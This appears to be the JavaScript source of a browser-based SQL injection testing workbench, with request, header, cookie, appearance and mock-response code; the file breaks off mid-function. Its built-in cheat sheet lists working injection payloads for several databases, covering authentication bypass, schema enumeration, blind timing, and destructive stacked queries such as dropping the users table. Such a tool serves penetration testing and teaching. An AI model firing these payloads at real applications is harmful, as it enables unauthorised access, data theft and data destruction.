
    /**
     * SQLi Workbench v2
     * - History: delete, rename, pin, drag-reorder
     * - Enhanced multi-DB Cheat Sheet
     * - Collapsible panels (Cheat Sheet, History, Payload)
     */

    // ===== State =====
    const state = {
      history: [],
      activeHistoryId: null,
      nextId: 1,
      headers: [
        { key: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', persist: true },
        { key: 'Cookie', value: '', persist: false },
      ],
      selectedBatchIds: [],
      collapsedBatches: {},
      isSending: false,
      dragId: null,
      lastRenderedHtml: '',
      historySearch: '',
      historyStatusFilter: 'all',
      historySort: { key: 'time', dir: 'desc' },
      openDetailId: null,
      nightProtect: true,       // derived: mode > 0
      nightProtectMode: 1,      // 0=off, 1=soft, 2=strict
      _npLastClick: 0,
      recording: false,
      endpoints: [], // { key, path, origin, paramNames[], sampleUrl, method, count }
      // Saved attack sources by batchId
      attackSources: {},
      // Attack mode
      attack: {
        active: false,
        paused: false,
        stop: false,
        total: 0,
        done: 0,
        batchId: null,
        payloads: [],
      },
    };

    // ===== DOM =====
    const $ = (s) => document.querySelector(s);
    const $$ = (s) => document.querySelectorAll(s);

    const methodSelect = $('#methodSelect');
    const urlInput = $('#urlInput');
    const sendBtn = $('#sendBtn');
    const toggleHeadersBtn = $('#toggleHeadersBtn');
    const headersPanel = $('#headersPanel');
    const headersList = $('#headersList');
    const addHeaderBtn = $('#addHeaderBtn');
    const clearHeadersBtn = $('#clearHeadersBtn');
    const payloadInput = $('#payloadInput');
    const urlEncodeBtn = $('#urlEncodeBtn');
    const urlDecodeBtn = $('#urlDecodeBtn');
    const clearPayloadBtn = $('#clearPayloadBtn');
    const injectBtn = $('#injectBtn');
    const postBodySection = $('#postBodySection');
    const postBodyInput = $('#postBodyInput');
    const injectIntoBodyBtn = $('#injectIntoBodyBtn');
    const clearBodyBtn = $('#clearBodyBtn');
    const historyList = $('#historyList');
    const clearHistoryBtn = $('#clearHistoryBtn');
    const cheatSheetBody = $('#cheatSheetBody');
    const toastEl = $('#toast');
    const renderedFrame = $('#rendered-frame');
    const renderedPlaceholder = $('#renderedPlaceholder');
    const rawResponse = $('#rawResponse');
    const metaTableWrap = $('#metaTableWrap');

    // ===== Enhanced Cheat Sheet (Multi-DB) =====
    const CHEAT_SHEET = [
      {
        title: 'Authentication Bypass',
        tag: 'generic',
        items: [
          { p: "' OR '1'='1", db: '' },
          { p: "' OR 1=1 -- -", db: '' },
          { p: "' OR '1'='1' --", db: '' },
          { p: "admin' --", db: '' },
          { p: "admin' #", db: 'MySQL' },
          { p: "' OR 1=1#", db: 'MySQL' },
          { p: "') OR ('1'='1", db: '' },
          { p: "' OR 'a'='a", db: '' },
          { p: "1' OR '1'='1' /*", db: '' },
        ],
      },
      {
        title: 'UNION — MySQL',
        tag: 'mysql',
        items: [
          { p: "ORDER BY 1-- -", db: 'MySQL' },
          { p: "ORDER BY 10-- -", db: 'MySQL' },
          { p: "UNION SELECT NULL-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,2,3-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,2,database()-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,2,version()-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", db: 'MySQL' },
          { p: "UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", db: 'MySQL' },
        ],
      },
      {
        title: 'UNION — MSSQL',
        tag: 'mssql',
        items: [
          { p: "ORDER BY 1--", db: 'MSSQL' },
          { p: "UNION SELECT NULL--", db: 'MSSQL' },
          { p: "UNION SELECT 1,2,3--", db: 'MSSQL' },
          { p: "UNION SELECT 1,@@version,3--", db: 'MSSQL' },
          { p: "UNION SELECT 1,db_name(),3--", db: 'MSSQL' },
          { p: "UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--", db: 'MSSQL' },
          { p: "UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--", db: 'MSSQL' },
        ],
      },
      {
        title: 'UNION — PostgreSQL',
        tag: 'pgsql',
        items: [
          { p: "ORDER BY 1-- -", db: 'PgSQL' },
          { p: "UNION SELECT NULL-- -", db: 'PgSQL' },
          { p: "UNION SELECT 1,2,3-- -", db: 'PgSQL' },
          { p: "UNION SELECT 1,version(),3-- -", db: 'PgSQL' },
          { p: "UNION SELECT 1,current_database(),3-- -", db: 'PgSQL' },
          { p: "UNION SELECT 1,tablename,3 FROM pg_tables-- -", db: 'PgSQL' },
          { p: "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", db: 'PgSQL' },
        ],
      },
      {
        title: 'UNION — Oracle',
        tag: 'oracle',
        items: [
          { p: "ORDER BY 1--", db: 'Oracle' },
          { p: "UNION SELECT NULL FROM dual--", db: 'Oracle' },
          { p: "UNION SELECT 1,2,3 FROM dual--", db: 'Oracle' },
          { p: "UNION SELECT 1,banner,3 FROM v$version--", db: 'Oracle' },
          { p: "UNION SELECT 1,table_name,3 FROM all_tables--", db: 'Oracle' },
          { p: "UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--", db: 'Oracle' },
        ],
      },
      {
        title: 'Error-Based',
        tag: 'mysql',
        items: [
          { p: "AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))", db: 'MySQL' },
          { p: "AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)", db: 'MySQL' },
          { p: "AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", db: 'MySQL' },
          { p: "' AND 1=CONVERT(int, (SELECT @@version))--", db: 'MSSQL' },
          { p: "AND 1=CAST((SELECT version()) AS int)--", db: 'PgSQL' },
        ],
      },
      {
        title: 'Time-Based Blind',
        tag: 'generic',
        items: [
          { p: "AND SLEEP(5)-- -", db: 'MySQL' },
          { p: "AND IF(1=1, SLEEP(5), 0)-- -", db: 'MySQL' },
          { p: "AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", db: 'MySQL' },
          { p: "; WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
          { p: "AND WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
          { p: "AND pg_sleep(5)-- -", db: 'PgSQL' },
          { p: "AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -", db: 'PgSQL' },
          { p: "AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", db: 'Oracle' },
        ],
      },
      {
        title: 'Boolean Blind',
        tag: 'generic',
        items: [
          { p: "AND 1=1-- -", db: '' },
          { p: "AND 1=2-- -", db: '' },
          { p: "AND SUBSTRING(database(),1,1)='a'-- -", db: 'MySQL' },
          { p: "AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -", db: 'MySQL' },
          { p: "AND LENGTH(database())>5-- -", db: 'MySQL' },
          { p: "AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64--", db: 'MSSQL' },
          { p: "AND SUBSTR((SELECT version()),1,1)='P'-- -", db: 'PgSQL' },
        ],
      },
      {
        title: 'Stacked Queries',
        tag: 'generic',
        items: [
          { p: "; SELECT SLEEP(5)-- -", db: 'MySQL' },
          { p: "; WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
          { p: "; DROP TABLE users--", db: '' },
          { p: "; INSERT INTO users VALUES('hacker','pass')--", db: '' },
        ],
      },
      {
        title: 'SQLite Specific',
        tag: 'sqlite',
        items: [
          { p: "' UNION SELECT 1,2,3--", db: 'SQLite' },
          { p: "' UNION SELECT sql,2,3 FROM sqlite_master--", db: 'SQLite' },
          { p: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", db: 'SQLite' },
        ],
      },
    ];

    // ===== Helpers =====
    function escapeHtml(str) {
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    }

    let toastTimer;
    function showToast(msg, type = '') {
      toastEl.textContent = msg;
      toastEl.className = 'toast show' + (type ? ' ' + type : '');
      clearTimeout(toastTimer);
      toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2200);
    }

    // ===== Mock Response =====
    function generateMockResponse(url, method, payload) {
      const isError = Math.random() < 0.22;
      const isTimeBased = /sleep|waitfor|pg_sleep|dbms_pipe/i.test(payload || '');
      const delay = isTimeBased ? 4800 + Math.random() * 900 : 70 + Math.random() * 250;
      const status = isError ? (Math.random() < 0.55 ? 500 : 400) : 200;

      let body = '';
      let contentType = 'text/html; charset=utf-8';

      if (status === 500) {
        body = `<!DOCTYPE html><html><head><title>500 Internal Server Error</title></head>
<body style="font-family:system-ui;padding:40px;background:#1a1a1a;color:#eee">
<h1 style="color:#ff5252">Internal Server Error</h1>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <b style="color:#00e676">'${escapeHtml(payload || '')}'</b> at line 1</p>
<pre style="background:#111;padding:16px;border-radius:6px;color:#ff8a80;overflow:auto">Warning: mysqli_query(): MySQL server has gone away in /var/www/html/page.php on line 42
Fatal error: Uncaught mysqli_sql_exception...</pre>
</body></html>`;
      } else if (status === 400) {
        body = `{"error":"Bad Request","message":"Invalid parameter","code":400}`;
        contentType = 'application/json';
      } else {
        const dbHint = /union|database\(\)|version\(\)|@@version|current_database/i.test(payload || '')
          ? `<div style="background:#0d1f0d;color:#00e676;padding:14px;font-family:monospace;margin:16px 0;border-radius:6px;border:1px solid #00c853">
               <strong>DB:</strong> webapp_prod &nbsp;|&nbsp; <strong>Version:</strong> 8.0.36-MySQL<br>
               <strong>User:</strong> app_user@localhost &nbsp;|&nbsp; <strong>Tables:</strong> users, sessions, products
             </div>`
          : '';
        body = `<!DOCTYPE html><html><head><title>Target App</title>
<style>body{font-family:system-ui;background:#f4f4f4;color:#222;margin:0;padding:40px}
.card{background:#fff;border-radius:8px;padding:24px;max-width:640px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
h1{margin-top:0;color:#1a1a2e}.badge{display:inline-block;background:#e8f5e9;color:#2e7d32;padding:4px 10px;border-radius:4px;font-size:13px}</style>
</head><body><div class="card"><h1>Welcome</h1>
<p class="badge">Query executed successfully</p>
<p>Processed: <code>${escapeHtml(url)}</code></p>${dbHint}
<p style="color:#888;font-size:13px">Mocked response for offline UI demonstration.</p></div></body></html>`;
      }

      return {
        status,
        statusText: status === 200 ? 'OK' : status === 400 ? 'Bad Request' : 'Internal Server Error',
        timeMs: Math.round(delay),
        headers: {
          'Content-Type': contentType,
          'Server': 'Apache/2.4.57 (Ubuntu)',
          'X-Powered-By': 'PHP/8.2.12',
          'Set-Cookie': 'PHPSESSID=mock' + Math.random().toString(36).slice(2, 10) + '; path=/; HttpOnly',
          'Content-Length': String(body.length),
          'Date': new Date().toUTCString(),
        },
        body,
      };
    }

    // ===== Headers UI =====
    const COMMON_HEADERS = [
      'User-Agent', 'Cookie', 'Authorization', 'Content-Type', 'Accept',
      'Accept-Language', 'Accept-Encoding', 'Referer', 'Origin', 'Host',
      'X-Forwarded-For', 'X-Real-IP', 'X-Requested-With', 'X-CSRF-Token',
      'Cache-Control', 'Connection', 'If-None-Match', 'If-Modified-Since',
      'Content-Length', 'Transfer-Encoding', 'Upgrade-Insecure-Requests',
      'Sec-Fetch-Site', 'Sec-Fetch-Mode', 'Sec-Fetch-Dest', 'DNT',
      'X-API-Key', 'Bearer', 'Proxy-Authorization',
    ];

    const HEADERS_LS_KEY = 'sqli-workbench-headers';

    function loadPersistedHeaders() {
      try {
        const raw = localStorage.getItem(HEADERS_LS_KEY);
        if (!raw) return;
        const arr = JSON.parse(raw);
        if (!Array.isArray(arr) || !arr.length) return;
        // Merge: start with persisted, keep non-persist defaults only if empty
        state.headers = arr.map(h => ({
          key: h.key || '',
          value: h.value || '',
          persist: !!h.persist,
        }));
      } catch { /* ignore */ }
    }

    function savePersistedHeaders() {
      try {
        // Save all headers that are marked persist (and keep structure of all for UX continuity of persist flags)
        const toSave = state.headers
          .filter(h => h.persist && (h.key || '').trim())
          .map(h => ({ key: h.key, value: h.value, persist: true }));
        localStorage.setItem(HEADERS_LS_KEY, JSON.stringify(toSave));
      } catch { /* ignore */ }
    }

    const COOKIE_META_KEY = 'sqli-workbench-cookie-meta';

    function loadCookieMeta() {
      try {
        const raw = localStorage.getItem(COOKIE_META_KEY);
        return raw ? JSON.parse(raw) : {};
      } catch { return {}; }
    }
    function saveCookieMeta(meta) {
      try { localStorage.setItem(COOKIE_META_KEY, JSON.stringify(meta || {})); } catch {}
    }

    function parseCookieHeaderValue(val) {
      const meta = loadCookieMeta();
      const list = [];
      String(val || '').split(';').forEach((part) => {
        const t = part.trim();
        if (!t) return;
        const eq = t.indexOf('=');
        if (eq <= 0) return;
        const name = t.slice(0, eq).trim();
        const value = t.slice(eq + 1).trim();
        const m = meta[name] || {};
        list.push({
          name,
          value,
          active: m.active !== false,
          persist: !!m.persist,
          note: m.note || '',
        });
      });
      return list;
    }

    function cookieListToHeaderValue(list) {
      return (list || [])
        .filter((c) => c.active && c.name)
        .map((c) => `${c.name}=${c.value || ''}`)
        .join('; ');
    }

    function openCookieManager() {
      const cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      const list = parseCookieHeaderValue(cookieHeader ? cookieHeader.value : '');
      state._cookieMgrList = list.length ? list : [{ name: '', value: '', active: true, persist: false, note: '' }];
      renderCookieManager();
      $('#cookieMgrOverlay')?.classList.add('open');
    }

    function closeCookieManager() {
      $('#cookieMgrOverlay')?.classList.remove('open');
    }

    function renderCookieManager() {
      const body = $('#cookieMgrBody');
      if (!body) return;
      const list = state._cookieMgrList || [];
      if (!list.length) {
        body.innerHTML = '<div class="adv-hint">No cookies yet. Click + Add.</div>';
        return;
      }
      body.innerHTML = list.map((c, i) => `
        <div class="cookie-mgr-item${c.active ? '' : ' off'}" data-i="${i}">
          <div class="cookie-mgr-row">
            <input type="checkbox" class="ck-active" ${c.active ? 'checked' : ''} title="Active in request" />
            <input type="text" class="ck-name" placeholder="name" value="${escapeHtml(c.name)}" spellcheck="false" />
            <span style="color:var(--text-muted)">=</span>
            <input type="text" class="ck-value" placeholder="value" value="${escapeHtml(c.value)}" spellcheck="false" />
            <button type="button" class="header-persist-btn${c.persist ? ' on' : ''} ck-persist" title="Survive refresh">${c.persist ? '📌' : '📍'}</button>
            <button type="button" class="btn-remove-header ck-del" title="Remove">×</button>
          </div>
          <textarea class="cookie-mgr-note ck-note" placeholder="Note (optional)…">${escapeHtml(c.note || '')}</textarea>
        </div>
      `).join('');

      body.querySelectorAll('.cookie-mgr-item').forEach((el) => {
        const i = +el.dataset.i;
        const sync = () => {
          const item = state._cookieMgrList[i];
          if (!item) return;
          item.active = !!el.querySelector('.ck-active')?.checked;
          item.name = el.querySelector('.ck-name')?.value || '';
          item.value = el.querySelector('.ck-value')?.value || '';
          item.note = el.querySelector('.ck-note')?.value || '';
          el.classList.toggle('off', !item.active);
        };
        el.querySelector('.ck-active')?.addEventListener('change', sync);
        el.querySelector('.ck-name')?.addEventListener('input', sync);
        el.querySelector('.ck-value')?.addEventListener('input', sync);
        el.querySelector('.ck-note')?.addEventListener('input', sync);
        el.querySelector('.ck-persist')?.addEventListener('click', () => {
          state._cookieMgrList[i].persist = !state._cookieMgrList[i].persist;
          renderCookieManager();
        });
        el.querySelector('.ck-del')?.addEventListener('click', () => {
          state._cookieMgrList.splice(i, 1);
          renderCookieManager();
        });
      });
    }

    function saveCookieManager() {
      const list = state._cookieMgrList || [];
      // Persist meta
      const meta = loadCookieMeta();
      list.forEach((c) => {
        if (!c.name) return;
        meta[c.name] = { active: !!c.active, persist: !!c.persist, note: c.note || '' };
      });
      // Drop meta for removed names? keep old notes for names still in meta is ok
      saveCookieMeta(meta);

      const headerVal = cookieListToHeaderValue(list);
      let cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      // Header-level persist if any cookie is persist
      const anyPersist = list.some((c) => c.persist && c.active);
      if (cookieHeader) {
        cookieHeader.value = headerVal;
        if (anyPersist) cookieHeader.persist = true;
      } else if (headerVal) {
        state.headers.push({ key: 'Cookie', value: headerVal, persist: anyPersist });
      }
      savePersistedHeaders();
      renderHeaders();
      closeCookieManager();
      showToast('Cookie header updated', 'success');
    }

    // Cookie manager buttons
    (function bindCookieMgr() {
      $('#cookieMgrClose')?.addEventListener('click', closeCookieManager);
      $('#cookieMgrSave')?.addEventListener('click', saveCookieManager);
      $('#cookieMgrAdd')?.addEventListener('click', () => {
        if (!state._cookieMgrList) state._cookieMgrList = [];
        state._cookieMgrList.push({ name: '', value: '', active: true, persist: false, note: '' });
        renderCookieManager();
      });
      $('#cookieMgrSelectAll')?.addEventListener('click', () => {
        (state._cookieMgrList || []).forEach((c) => { c.active = true; });
        renderCookieManager();
      });
      $('#cookieMgrSelectNone')?.addEventListener('click', () => {
        (state._cookieMgrList || []).forEach((c) => { c.active = false; });
        renderCookieManager();
      });
    })();

    function renderHeaders() {
      if (!headersList) return;
      headersList.innerHTML = '';
      state.headers.forEach((h, idx) => {
        const row = document.createElement('div');
        const isCookie = (h.key || '').toLowerCase() === 'cookie';
        row.className = 'header-row' + (isCookie ? ' cookie-header-row' : '');
        const pinOn = !!h.persist;
        row.innerHTML = `
          <div class="header-key-wrap">
            <input class="header-key" type="text" placeholder="Header name" value="${escapeHtml(h.key)}" data-idx="${idx}" data-field="key" spellcheck="false" autocomplete="off" />
            <div class="header-suggest" data-idx="${idx}"></div>
          </div>
          <input class="header-value" type="text" placeholder="Value" value="${escapeHtml(h.value)}" data-idx="${idx}" data-field="value" spellcheck="false" />
          ${isCookie ? `<button type="button" class="header-cookie-manage" data-idx="${idx}" title="Manage cookies">Manage</button>` : ''}
          <button type="button" class="header-persist-btn${pinOn ? ' on' : ''}" data-idx="${idx}" title="${pinOn ? 'Pinned — survives refresh' : 'Pin — keep after refresh'}">${pinOn ? '📌 Pin' : '📍 Pin'}</button>
          <button class="btn-remove-header" data-idx="${idx}" title="Remove">×</button>`;
        headersList.appendChild(row);
      });

      headersList.querySelectorAll('input').forEach((inp) => {
        inp.addEventListener('input', (e) => {
          const i = +e.target.dataset.idx;
          const field = e.target.dataset.field;
          if (!state.headers[i]) return;
          state.headers[i][field] = e.target.value;
          if (field === 'key') updateHeaderSuggest(e.target);
          if (state.headers[i].persist) savePersistedHeaders();
        });
        if (inp.classList.contains('header-key')) {
          inp.addEventListener('focus', (e) => updateHeaderSuggest(e.target));
          inp.addEventListener('blur', (e) => {
            setTimeout(() => {
              const box = e.target.parentElement.querySelector('.header-suggest');
              if (box) box.classList.remove('open');
              const anyOpen = !!document.querySelector('#stab-headers .header-suggest.open');
              setSettingsSuggestOpen(anyOpen);
              // Refresh row UI when key is Cookie (Manage button)
              renderHeaders();
            }, 150);
          });
          inp.addEventListener('keydown', (e) => {
            const box = e.target.parentElement.querySelector('.header-suggest');
            if (!box || !box.classList.contains('open')) return;
            const items = [...box.querySelectorAll('.header-suggest-item')];
            let active = items.findIndex((el) => el.classList.contains('active'));
            if (e.key === 'ArrowDown') {
              e.preventDefault();
              active = Math.min(items.length - 1, active + 1);
              items.forEach((el, i) => el.classList.toggle('active', i === active));
            } else if (e.key === 'ArrowUp') {
              e.preventDefault();
              active = Math.max(0, active - 1);
              items.forEach((el, i) => el.classList.toggle('active', i === active));
            } else if (e.key === 'Enter' && active >= 0) {
              e.preventDefault();
              items[active].click();
            } else if (e.key === 'Escape') {
              box.classList.remove('open');
            }
          });
        }
      });

      headersList.querySelectorAll('.header-cookie-manage').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          openCookieManager();
        });
      });
      // Double-click Cookie value also opens manager
      headersList.querySelectorAll('.cookie-header-row .header-value').forEach((inp) => {
        inp.addEventListener('dblclick', () => openCookieManager());
      });

      headersList.querySelectorAll('.header-persist-btn').forEach((btn) => {
        btn.addEventListener('click', () => {
          const i = +btn.dataset.idx;
          if (!state.headers[i]) return;
          state.headers[i].persist = !state.headers[i].persist;
          savePersistedHeaders();
          renderHeaders();
          showToast(state.headers[i].persist ? 'Header pinned — survives refresh' : 'Header unpinned', 'success');
        });
      });

      headersList.querySelectorAll('.btn-remove-header').forEach((btn) => {
        btn.addEventListener('click', () => {
          state.headers.splice(+btn.dataset.idx, 1);
          savePersistedHeaders();
          renderHeaders();
        });
      });
    }

    function setSettingsSuggestOpen(open) {
      const panel = document.getElementById('settingsPanel');
      if (!panel) return;
      panel.classList.toggle('suggest-open', !!open);
    }

    function updateHeaderSuggest(input) {
      const box = input.parentElement.querySelector('.header-suggest');
      if (!box) return;
      const q = (input.value || '').toLowerCase().trim();
      const used = new Set(state.headers.map((h) => (h.key || '').toLowerCase()));
      let list = COMMON_HEADERS.filter((h) => !used.has(h.toLowerCase()) || h.toLowerCase() === q);
      if (q) list = list.filter((h) => h.toLowerCase().includes(q));
      list = list.slice(0, 8);
      if (!list.length) {
        box.classList.remove('open');
        box.innerHTML = '';
        // keep suggest-open if another box is still open
        const anyOpen = !!document.querySelector('#stab-headers .header-suggest.open');
        setSettingsSuggestOpen(anyOpen);
        return;
      }
      box.innerHTML = list.map((h, i) => {
        let label = escapeHtml(h);
        if (q) {
          const idx = h.toLowerCase().indexOf(q);
          if (idx >= 0) {
            label = escapeHtml(h.slice(0, idx)) + '<mark>' + escapeHtml(h.slice(idx, idx + q.length)) + '</mark>' + escapeHtml(h.slice(idx + q.length));
          }
        }
        return `<div class="header-suggest-item${i === 0 ? ' active' : ''}" data-val="${escapeHtml(h)}">${label}</div>`;
      }).join('');
      box.classList.add('open');
      setSettingsSuggestOpen(true);

      // Scroll the active header row into view so 2–3 items of the dropdown are visible
      const row = input.closest('.header-row');
      const body = document.querySelector('#settingsPanel .vpanel-body');
      if (row && body) {
        // small delay so layout (padding-bottom) applies first
        requestAnimationFrame(() => {
          row.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
        });
      }

      box.querySelectorAll('.header-suggest-item').forEach((item) => {
        item.addEventListener('mousedown', (e) => {
          e.preventDefault();
          const idx = +input.dataset.idx;
          input.value = item.dataset.val;
          if (state.headers[idx]) state.headers[idx].key = item.dataset.val;
          box.classList.remove('open');
          setSettingsSuggestOpen(false);
          // focus value field
          const valInp = input.closest('.header-row')?.querySelector('.header-value');
          if (valInp) valInp.focus();
        });
      });
    }

    addHeaderBtn.addEventListener('click', () => {
      state.headers.push({ key: '', value: '', persist: false });
      renderHeaders();
      const rows = headersList.querySelectorAll('.header-row');
      const last = rows[rows.length - 1];
      const keyInp = last && last.querySelector('.header-key');
      if (keyInp) {
        keyInp.focus();
        updateHeaderSuggest(keyInp);
      }
    });
    clearHeadersBtn.addEventListener('click', () => {
      // Keep pinned headers
      state.headers = state.headers.filter(h => h.persist);
      savePersistedHeaders();
      renderHeaders();
      showToast('Cleared non-pinned headers');
    });
    function openHeadersSettings() {
      openVPanel('settings');
      switchSettingsTab('headers');
    }
    toggleHeadersBtn.addEventListener('click', openHeadersSettings);
    const payloadHeadersBtn = $('#payloadHeadersBtn');
    if (payloadHeadersBtn) {
      payloadHeadersBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        openHeadersSettings();
      });
    }
    // Load pinned headers early
    loadPersistedHeaders();

    // Settings tabs
    function switchSettingsTab(name) {
      $$('.settings-tab').forEach((t) => t.classList.toggle('active', t.dataset.stab === name));
      $$('.settings-tab-panel').forEach((p) => p.classList.toggle('active', p.id === 'stab-' + name));
      if (name === 'shortcuts' && typeof renderShortcutsList === 'function') renderShortcutsList();
    }
    $$('.settings-tab').forEach((tab) => {
      tab.addEventListener('click', () => switchSettingsTab(tab.dataset.stab));
    });

    // ===== Appearance (persisted in localStorage) =====
    const APPEAR_KEY = 'sqli-workbench-appearance';
    const BG_PRESETS = {
      default: { primary: '#0e0e10', secondary: '#141418', tertiary: '#1a1a22', elevated: '#24242e', input: '#121218' },
      deeper:  { primary: '#050505', secondary: '#0a0a0a', tertiary: '#121212', elevated: '#1c1c1c', input: '#0a0a0a' },
      slate:   { primary: '#0f1115', secondary: '#151820', tertiary: '#1c2030', elevated: '#262b3a', input: '#12151c' },
      navy:    { primary: '#0a0e1a', secondary: '#0f1524', tertiary: '#151d30', elevated: '#1e2840', input: '#0c1220' },
      olive:   { primary: '#0e100c', secondary: '#141712', tertiary: '#1a1e16', elevated: '#242a1e', input: '#12150f' },
    };

    function loadAppearance() {
      try {
        return JSON.parse(localStorage.getItem(APPEAR_KEY) || '{}');
      } catch { return {}; }
    }

    function saveAppearance(cfg) {
      try { localStorage.setItem(APPEAR_KEY, JSON.stringify(cfg)); } catch {}
    }

    function applyAppearance(cfg) {
      const root = document.documentElement;
      const accent = cfg.accent || '#6c5ce7';
      root.style.setProperty('--accent', accent);
      root.style.setProperty('--accent-dim', accent);
      root.style.setProperty('--accent-bright', accent);
      // derive a lighter bright variant roughly
      root.style.setProperty('--accent-bright', accent);

      const bg = BG_PRESETS[cfg.bg] || BG_PRESETS.default;
      root.style.setProperty('--bg-primary', bg.primary);
      root.style.setProperty('--bg-secondary', bg.secondary);
      root.style.setProperty('--bg-tertiary', bg.tertiary);
      root.style.setProperty('--bg-elevated', bg.elevated);
      root.style.setProperty('--bg-input', bg.input);

      const scale = cfg.scale || 100;
      document.body.style.zoom = scale === 100 ? '' : (scale / 100);

      const radius = cfg.radius != null ? cfg.radius : 6;
      root.style.setProperty('--radius', radius + 'px');

      const mono = cfg.monoSize || 13;
      root.style.setProperty('--mono-size', mono + 'px');

      // density
      if (cfg.density === 'compact') {
        document.body.classList.add('density-compact');
      } else {
        document.body.classList.remove('density-compact');
      }

      // sync controls if present
      const accentEl = $('#appearAccent');
      if (accentEl) accentEl.value = accent;
      const bgEl = $('#appearBg');
      if (bgEl) bgEl.value = cfg.bg || 'default';
      const scaleEl = $('#appearScale');
      if (scaleEl) scaleEl.value = scale;
      const scaleLabel = $('#appearScaleLabel');
      if (scaleLabel) scaleLabel.textContent = scale + '%';
      const densEl = $('#appearDensity');
      if (densEl) densEl.value = cfg.density || 'comfortable';
      const radEl = $('#appearRadius');
      if (radEl) radEl.value = String(radius);
      const monoEl = $('#appearMonoSize');
      if (monoEl) monoEl.value = String(mono);
      $$('.appear-preset').forEach((b) => {
        b.classList.toggle('active', b.dataset.color === accent);
      });
    }

    function initAppearanceControls() {
      let cfg = loadAppearance();
      applyAppearance(cfg);

      const persist = () => {
        cfg = {
          accent: $('#appearAccent')?.value || cfg.accent,
          bg: $('#appearBg')?.value || cfg.bg,
          scale: +($('#appearScale')?.value || cfg.scale || 100),
          density: $('#appearDensity')?.value || cfg.density,
          radius: +($('#appearRadius')?.value || cfg.radius || 6),
          monoSize: +($('#appearMonoSize')?.value || cfg.monoSize || 13),
        };
        saveAppearance(cfg);
        applyAppearance(cfg);
      };

      ['appearAccent', 'appearBg', 'appearScale', 'appearDensity', 'appearRadius', 'appearMonoSize'].forEach((id) => {
        const el = $('#' + id);
        if (!el) return;
        el.addEventListener('input', persist);
        el.addEventListener('change', persist);
      });
      $$('.appear-preset').forEach((btn) => {
        btn.addEventListener('click', () => {
          const accentEl = $('#appearAccent');
          if (accentEl) accentEl.value = btn.dataset.color;
          persist();
        });
      });
      const resetBtn = $('#appearResetBtn');
      if (resetBtn) {
        resetBtn.addEventListener('click', () => {
          cfg = {};
          saveAppearance(cfg);
          applyAppearance(cfg);
          showToast('Appearance reset', 'success');
        });
      }
    }

    // ===== Cheat Sheet =====
    function renderCheatSheet() {
      cheatSheetBody.innerHTML = '';
      CHEAT_SHEET.forEach((cat, catIdx) => {
        const section = document.createElement('div');
        section.className = 'cheat-category';
        const tagClass = `tag-${cat.tag}`;
        section.innerHTML = `
          <div class="cheat-category-title" data-cat="${catIdx}">
            <span class="chevron">▼</span>
            ${cat.title}
            <span class="cheat-db-tag ${tagClass}">${cat.tag === 'generic' ? 'ALL' : cat.tag.toUpperCase()}</span>
          </div>
          <div class="cheat-items">
            ${cat.items.map((item) => `
              <div class="cheat-item" data-payload="${escapeHtml(item.p)}" title="Click to insert">
                ${item.db ? `<span class="db-badge tag-${cat.tag}">${item.db}</span>` : ''}
                ${escapeHtml(item.p)}
              </div>
            `).join('')}
          </div>`;
        cheatSheetBody.appendChild(section);
      });

      cheatSheetBody.querySelectorAll('.cheat-category-title').forEach((el) => {
        el.addEventListener('click', () => el.parentElement.classList.toggle('collapsed'));
      });
      cheatSheetBody.querySelectorAll('.cheat-item').forEach((el) => {
        el.addEventListener('click', () => {
          payloadInput.value = el.dataset.payload;
          updatePayloadSummary();
          openVPanel('payload');
          showToast('Payload inserted', 'success');
        });
      });
    }

    // ===== Payload Utils =====
    urlEncodeBtn.addEventListener('click', () => {
      if (!payloadInput.value) return;
      payloadInput.value = encodeURIComponent(payloadInput.value).replace(/%20/g, '+');
      showToast('URL Encoded');
    });
    urlDecodeBtn.addEventListener('click', () => {
      try {
        payloadInput.value = decodeURIComponent(payloadInput.value.replace(/\+/g, ' '));
        showToast('URL Decoded');
      } catch { showToast('Decode failed'); }
    });
    clearPayloadBtn.addEventListener('click', () => { payloadInput.value = ''; payloadInput.focus(); });

    // Show / hide Request Body section based on HTTP method
    function updateBodyVisibility() {
      const m = methodSelect.value;
      if (['POST', 'PUT', 'PATCH'].includes(m)) {
        postBodySection.style.display = 'block';
      } else {
